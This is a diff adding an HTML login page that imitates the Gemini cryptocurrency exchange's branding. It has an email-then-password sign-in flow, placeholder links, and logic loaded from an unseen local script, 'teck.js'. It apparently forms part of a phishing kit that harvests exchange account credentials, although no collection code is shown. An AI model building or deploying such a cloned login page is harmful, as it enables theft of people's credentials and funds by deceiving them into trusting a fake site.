@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log In | Gemini® | Crypto Exchange</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
+            background-color: #ffffff;
+            color: #1a1a1a;
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            background-color: #ffffff;
+        }
+
+        /* Header */
+        .header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 70px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 40px;
+            background-color: white;
+            border-bottom: 1px solid #f0f0f0;
+            z-index: 100;
+        }
+
+        .gemini-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #1a1a1a;
+        }
+
+        .gemini-logo svg {
+            width: 28px;
+            height: 28px;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .header-text {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .create-account-btn {
+            background-color: #e8e8e8;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .create-account-btn:hover {
+            background-color: #d8d8d8;
+        }
+
+        /* Main Content */
+        .main-content {
+            margin-top: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: calc(100vh - 70px);
+            padding: 40px 20px;
+        }
+
+        .form-wrapper {
+            width: 100%;
+            max-width: 540px;
+        }
+
+        .form-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .form-header h1 {
+            font-size: 40px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .form-header p {
+            font-size: 15px;
+            color: #666;
+        }
+
+        .form-header a {
+            color: #0052ff;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .form-header a:hover {
+            text-decoration: underline;
+        }
+
+        /* Form Sections */
+        .form-section {
+            display: none;
+            animation: fadeIn 0.3s ease-in;
+        }
+
+        .form-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: #1a1a1a;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #d0d0d0;
+            border-radius: 8px;
+            font-size: 16px;
+            font-family: inherit;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            background-color: white;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #0052ff;
+            box-shadow: 0 0 0 3px rgba(0, 82, 255, 0.1);
+        }
+
+        .form-group input::placeholder {
+            color: #999;
+        }
+
+        /* Email Confirmation Box */
+        .email-confirmation {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px;
+            background-color: #f5f5f5;
+            border-radius: 8px;
+            margin-bottom: 24px;
+        }
+
+        .email-confirmation-content {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .email-confirmation-icon {
+            width: 32px;
+            height: 32px;
+            background-color: #e8e8e8;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .email-confirmation-text {
+            font-size: 15px;
+            font-weight: 500;
+            color: #1a1a1a;
+            word-break: break-all;
+        }
+
+        .change-email-btn {
+            background: none;
+            border: none;
+            color: #0052ff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 4px 8px;
+            transition: opacity 0.2s;
+        }
+
+        .change-email-btn:hover {
+            opacity: 0.7;
+        }
+
+        /* Password Toggle */
+        .password-input-wrapper {
+            position: relative;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #666;
+            font-size: 18px;
+        }
+
+        .password-toggle:hover {
+            color: #1a1a1a;
+        }
+
+        /* Forgot Password */
+        .forgot-password {
+            text-align: left;
+            margin-bottom: 24px;
+        }
+
+        .forgot-password a {
+            font-size: 14px;
+            color: #0052ff;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        /* Buttons */
+        .continue-btn, .signin-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #1a1a1a;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .continue-btn:hover:not(:disabled), .signin-btn:hover:not(:disabled) {
+            background-color: #333;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        .continue-btn:active:not(:disabled), .signin-btn:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .continue-btn:disabled, .signin-btn:disabled {
+            background-color: #e8e8e8;
+            color: #999;
+            cursor: not-allowed;
+        }
+
+        /* Spinner Animation */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            font-size: 13px;
+            color: #999;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #d0d0d0;
+        }
+
+        .divider span {
+            padding: 0 16px;
+        }
+
+        /* Passkey Button */
+        .passkey-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #f5f5f5;
+            border: 1px solid #d0d0d0;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #1a1a1a;
+        }
+
+        .passkey-btn:hover {
+            background-color: #efefef;
+        }
+
+        .passkey-icon {
+            width: 18px;
+            height: 18px;
+        }
+
+        /* Signup Link */
+        .signup-section {
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-section a {
+            color: #0052ff;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-section a:hover {
+            text-decoration: underline;
+        }
+
+        /* reCAPTCHA */
+        .recaptcha-note {
+            font-size: 11px;
+            color: #999;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header {
+                padding: 0 20px;
+                height: 60px;
+            }
+
+            .main-content {
+                margin-top: 60px;
+                min-height: calc(100vh - 60px);
+                padding: 30px 16px;
+            }
+
+            .form-wrapper {
+                max-width: 100%;
+            }
+
+            .form-header h1 {
+                font-size: 32px;
+            }
+
+            .header-right {
+                gap: 12px;
+            }
+
+            .header-text {
+                display: none;
+            }
+
+            .create-account-btn {
+                padding: 8px 16px;
+                font-size: 13px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                padding: 0 16px;
+                height: 56px;
+            }
+
+            .main-content {
+                margin-top: 56px;
+                min-height: calc(100vh - 56px);
+                padding: 24px 16px;
+            }
+
+            .form-header h1 {
+                font-size: 28px;
+            }
+
+            .form-header {
+                margin-bottom: 32px;
+            }
+
+            .gemini-logo {
+                gap: 6px;
+                font-size: 16px;
+            }
+
+            .gemini-logo svg {
+                width: 24px;
+                height: 24px;
+            }
+
+            .create-account-btn {
+                padding: 8px 12px;
+                font-size: 12px;
+            }
+
+            .email-confirmation {
+                padding: 12px;
+                margin-bottom: 20px;
+            }
+
+            .email-confirmation-icon {
+                width: 28px;
+                height: 28px;
+            }
+
+            .email-confirmation-text {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="gemini-logo">
+            <svg viewBox="0 0 129.33 128.94" xmlns="http://www.w3.org/2000/svg">
+                <path d="M83.86 2a43.53 43.53 0 00-43 38.64 43.26 43.26 0 004.63 86.28 43.53 43.53 0 0043-38.64A43.26 43.26 0 0083.86 2zM117 50.17a33.7 33.7 0 01-28.25 28.24V50.17zM12.35 78.77a33.69 33.69 0 0128.24-28.23v28.23zm66.25 9.78a33.48 33.48 0 01-66.25 0zm.4-38.38v28.6H50.37v-28.6zm38-9.78H50.73a33.48 33.48 0 0166.25 0z" fill="#26ddf9"/>
+            </svg>
+            Gemini
+        </div>
+
+        <div class="header-right">
+            <span class="header-text">Don't have a Gemini account?</span>
+            <button class="create-account-btn">Create a new account</button>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <div class="form-wrapper">
+            <!-- Email Step -->
+            <div class="form-section active" id="emailSection">
+                <div class="form-header">
+                    <h1>Sign in</h1>
+                </div>
+
+                <form id="emailForm">
+                    <div class="form-group">
+                        <input 
+                            type="email" 
+                            id="emailInput" 
+                            name="email" 
+                            placeholder="Email address" 
+                            required
+                            autocomplete="email"
+                        >
+                    </div>
+
+                    <button type="submit" class="continue-btn" id="continueBtn">Continue</button>
+
+                    <div class="divider">
+                        <span>OR</span>
+                    </div>
+
+                    <button type="button" class="passkey-btn">
+                        <svg class="passkey-icon" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5s-5 2.24-5 5v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                        </svg>
+                        Sign in with passkey
+                    </button>
+
+                    <div class="divider">
+                        <span>OR</span>
+                    </div>
+
+                    <div class="signup-section">
+                        New to Gemini? <a href="#signup">Create an account</a>
+                    </div>
+
+                    <div class="recaptcha-note">
+                        This site is protected by reCAPTCHA and the Google<br>
+                        <a href="#" style="color: #0052ff; text-decoration: none;">Privacy Policy</a> and 
+                        <a href="#" style="color: #0052ff; text-decoration: none;">Terms of Service</a> apply.
+                    </div>
+                </form>
+            </div>
+
+            <!-- Password Step -->
+            <div class="form-section" id="passwordSection">
+                <div class="form-header">
+                    <h1>Welcome</h1>
+                </div>
+
+                <div class="email-confirmation">
+                    <div class="email-confirmation-content">
+                        <div class="email-confirmation-icon">
+                            <svg viewBox="0 0 24 24" fill="currentColor" style="width: 16px; height: 16px;">
+                                <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                            </svg>
+                        </div>
+                        <span class="email-confirmation-text" id="displayEmail"></span>
+                    </div>
+                    <button type="button" class="change-email-btn" id="changeEmailBtn">Change</button>
+                </div>
+
+                <form id="passwordForm">
+                    <div class="form-group">
+                        <label for="passwordInput">Password</label>
+                        <div class="password-input-wrapper">
+                            <input 
+                                type="password" 
+                                id="passwordInput" 
+                                name="password" 
+                                placeholder="Password" 
+                                required
+                                autocomplete="current-password"
+                            >
+                            <button type="button" class="password-toggle" id="passwordToggle">👁️</button>
+                        </div>
+                    </div>
+
+                    <div class="forgot-password">
+                        <a href="#forgot">Forgot password?</a>
+                    </div>
+
+                    <button type="submit" class="signin-btn" id="signinBtn">Sign in</button>
+
+                    <div class="divider">
+                        <span>OR</span>
+                    </div>
+
+                    <button type="button" class="passkey-btn">
+                        <svg class="passkey-icon" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5s-5 2.24-5 5v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                        </svg>
+                        Sign in with passkey
+                    </button>
+
+                    <div class="recaptcha-note">
+                        This site is protected by reCAPTCHA and the Google<br>
+                        <a href="#" style="color: #0052ff; text-decoration: none;">Privacy Policy</a> and 
+                        <a href="#" style="color: #0052ff; text-decoration: none;">Terms of Service</a> apply.
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script src="./teck.js"></script>
+</body>
+</html>
